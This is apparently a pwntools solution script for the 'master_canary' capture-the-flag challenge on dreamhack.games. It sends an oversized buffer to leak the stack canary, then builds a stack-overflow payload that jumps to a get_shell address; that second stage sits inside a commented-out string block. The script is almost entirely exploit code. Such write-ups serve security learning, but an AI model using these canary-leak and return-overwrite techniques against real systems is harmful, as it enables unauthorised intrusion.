from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"
#p = process("./master_canary")
p = remote("host3.dreamhack.games", 12327)
#gdb.attach(p,gdbscript='''b*0x400c23\nc''')

#######################
# STEP_1: Leak_canary #
#######################
p.sendline(b"1")
p.sendline(b"2")
p.recvuntil(b"Size: ")
p.sendline(str(2345))
payload = b"a"*2345  
p.sendline(payload)
'''
p.recvuntil(payload)
canary = int.from_bytes(p.recv(7), "little") << 2*4
print("[+]Canary:",hex(canary))

###################
# STEP_1: Exploit #
###################

p.sendline(b"3")
get_shell = 0x400a4a
p.recvuntil(b"Leave comment: ")
payload =b"a"*0x28 + p64(canary) + b"a"*8 + p64(get_shell)
p.sendline(payload)
'''
p.interactive()

